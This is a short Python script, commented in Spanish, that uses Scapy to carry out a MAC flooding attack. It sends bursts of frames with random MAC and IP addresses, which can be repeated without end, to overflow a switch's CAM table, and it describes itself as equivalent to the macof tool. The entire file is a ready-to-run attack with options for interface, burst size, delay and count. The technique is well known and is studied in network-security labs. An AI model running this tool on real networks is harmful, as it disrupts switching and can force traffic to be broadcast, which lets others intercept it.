#!/usr/bin/env python3
"""
MAC Flooding
Inunda la tabla CAM del switch con tramas de MAC origen aleatoria.
Equivalente a macof.

Ejemplos:
    sudo python3 mac_flooding.py -i eth0
    sudo python3 mac_flooding.py -i eth0 -n 1000 -d 0.001 -c 10
"""
import argparse
import time
from scapy.all import sendp, Ether, IP, UDP, RandMAC, RandIP

def parse_args():
    ap = argparse.ArgumentParser(description="Ataque MAC Flooding")
    ap.add_argument("-i", "--iface", required=True, help="Interfaz de red")
    ap.add_argument("-n", "--num", type=int, default=500,
                    help="Tramas por rafaga (def. 500)")
    ap.add_argument("-d", "--delay", type=float, default=0.0,
                    help="Retardo entre tramas en seg (def. 0)")
    ap.add_argument("-c", "--count", type=int, default=0,
                    help="Numero de rafagas (0 = infinito)")
    return ap.parse_args()

def main():
    args = parse_args()
    print(f"--- Iniciando MAC Flooding por {args.iface} ---")
    print("Presiona Ctrl+C para detener el ataque.\n")

    rafaga = 1
    try:
        while args.count == 0 or rafaga <= args.count:
            print(f"[*] Iniciando rafaga #{rafaga}")
            for _ in range(args.num):
                pkt = (Ether(src=RandMAC(), dst=RandMAC()) /
                       IP(src=RandIP(), dst=RandIP()) /
                       UDP(sport=1234, dport=80))
                sendp(pkt, iface=args.iface, verbose=False)
                if args.delay:
                    time.sleep(args.delay)
            print(f"[+] Rafaga #{rafaga} completada ({args.num} tramas).")
            rafaga += 1
    except KeyboardInterrupt:
        print("\n[!] MAC Flooding detenido.")

if __name__ == "__main__":
    main()
